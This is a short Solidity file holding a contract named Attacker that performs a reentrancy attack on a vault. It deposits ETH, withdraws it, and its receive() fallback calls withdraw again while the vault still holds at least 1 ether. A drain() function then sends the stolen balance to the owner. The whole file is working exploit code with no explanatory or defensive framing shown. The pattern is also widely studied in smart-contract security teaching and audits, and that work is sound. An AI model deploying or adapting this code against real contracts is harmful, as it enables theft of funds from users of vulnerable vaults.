// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need ETH");

        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function drain() external {
        payable(owner).transfer(address(this).balance);
    }
}